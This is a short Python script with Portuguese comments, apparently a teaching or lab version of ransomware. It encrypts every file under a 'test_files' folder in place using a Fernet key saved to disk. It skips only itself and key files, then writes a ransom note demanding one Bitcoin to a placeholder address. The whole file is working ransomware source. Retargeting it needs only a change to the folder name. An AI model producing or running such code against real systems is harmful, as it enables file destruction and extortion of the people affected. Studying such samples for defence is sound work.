# -*- coding: utf-8 -*-
from cryptography.fernet import Fernet
import os

def gerar_chave():
    """Gera uma chave e a salva em um arquivo."""
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)


def carregar_chave():
    """Carrega a chave de um arquivo."""
    return open("chave.key", "rb").read()


def criptografar_arquivo(arquivo, chave):
    """Criptografa um arquivo usando a chave fornecida."""
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados= f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

def encontrar_arquivos(diretorio):
    """Encontra todos os arquivos em um diretório e seus subdiretórios."""
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    """Cria uma mensagem de resgate."""
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Para recuperá-los, envie 1 Bitcoin para o endereço XXXXXX.\n")
        f.write("Depois de pagar, envie um e-mail para recuperar seus arquivos.\n")


def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware Executado! Todos os arquivos foram criptografados!")

if __name__ == "__main__":
    main()